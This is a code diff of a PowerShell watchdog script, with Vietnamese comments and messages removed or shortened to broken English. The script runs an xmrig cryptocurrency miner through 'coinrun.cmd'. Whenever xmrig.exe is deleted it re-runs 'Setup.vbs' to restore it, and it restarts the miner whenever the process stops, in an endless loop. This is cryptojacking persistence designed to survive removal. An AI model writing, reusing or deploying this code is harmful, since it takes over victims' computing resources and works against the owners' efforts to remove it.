@@ -7,51 +7,46 @@ function Start-CoinRun {
     Write-Host "coinrun.cmd START"
 }
 
-# Khởi chạy lần đầu nếu file tồn tại
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
-    Write-Warning "xmrig.exe không tồn tại ban đầu. Đang chạy Setup.vbs nếu có..."
+    Write-Warning "xmrig.exe DoseNotExist..."
     if (Test-Path $setupPath) {
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-        Write-Host "Đã khởi chạy Setup.vbs"
+        Write-Host "Running Setup.vbs"
 
-        # Chờ cho đến khi xmrig được khôi phục rồi mới chạy lại coinrun.cmd
         while (!(Test-Path $xmrigPath)) {
-            Write-Host "Đang chờ xmrig.exe được tạo lại..."
+            Write-Host "Wait xmrig.exe..."
             Start-Sleep -Seconds 3
         }
 
-        Write-Host "Đã phát hiện xmrig.exe. Khởi chạy coinrun.cmd"
+        Write-Host "xmrig.exe. RUN coinrun.cmd"
         Start-CoinRun
     } else {
-        Write-Error "Không tìm thấy Setup.vbs để phục hồi xmrig.exe"
+        Write-Error "NO Setup.vbs"
     }
 }
 
 while ($true) {
-    # 1. Giám sát file xmrig.exe
     if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."
+        Write-Warning "xmrig.exe Del. Wait..."
 
         if (Test-Path $setupPath) {
             Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-            Write-Host "Đã khởi chạy lại Setup.vbs!"
+            Write-Host "Run Setup.vbs!"
 
-            # Đợi cho đến khi xmrig.exe xuất hiện lại
             while (!(Test-Path $xmrigPath)) {
-                Write-Host "Đang chờ xmrig.exe được tạo lại..."
+                Write-Host "Wait.. xmrig.exe"
                 Start-Sleep -Seconds 3
             }
 
             Write-Host "Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
             Start-CoinRun
         } else {
-            Write-Error "Không tìm thấy Setup.vbs tại: $setupPath"
+            Write-Error "NO Setup.vbs: $setupPath"
         }
     }
 
-    # 2. Giám sát tiến trình coinrun.cmd
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
         Write-Warning "coinrun.cmd STOP. Reboot..."
         Start-CoinRun
